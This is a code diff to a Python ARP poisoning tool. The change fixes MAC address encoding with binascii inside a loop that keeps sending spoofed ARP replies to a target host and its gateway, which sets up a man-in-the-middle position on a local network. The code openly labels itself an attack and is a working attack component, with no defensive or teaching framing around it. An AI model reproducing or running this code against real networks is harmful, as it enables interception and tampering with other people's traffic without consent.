@@ -1,6 +1,7 @@
 from arp import ArpRequest, ARP
 from scanner import Local
 import time
+import binascii
 
 
 class ArpPoison:
@@ -9,10 +10,10 @@ class ArpPoison:
         print("[*] Starting ARP Poisoning Attack...")
         while True:
             # Send Arp Packets to poison target and gateway
-            ARP.send_arp(src_mac=local_mac, src_ip=gateway_ip,
-                         dst_mac=target_mac, dst_ip=target_ip, operation=ARP.OPCODE_REPLY)
-            ARP.send_arp(src_mac=local_mac, src_ip=target_ip,
-                         dst_mac=gateway_mac, dst_ip=gateway_ip, operation=ARP.OPCODE_REPLY)
+            ARP.send_arp(src_mac=binascii.unhexlify(local_mac), src_ip=gateway_ip,
+                         dst_mac=binascii.unhexlify(target_mac), dst_ip=target_ip, operation=ARP.OPCODE_REPLY)
+            ARP.send_arp(src_mac=binascii.unhexlify(local_mac), src_ip=target_ip,
+                         dst_mac=binascii.unhexlify(gateway_mac), dst_ip=gateway_ip, operation=ARP.OPCODE_REPLY)
             time.sleep(2)
 
     @staticmethod
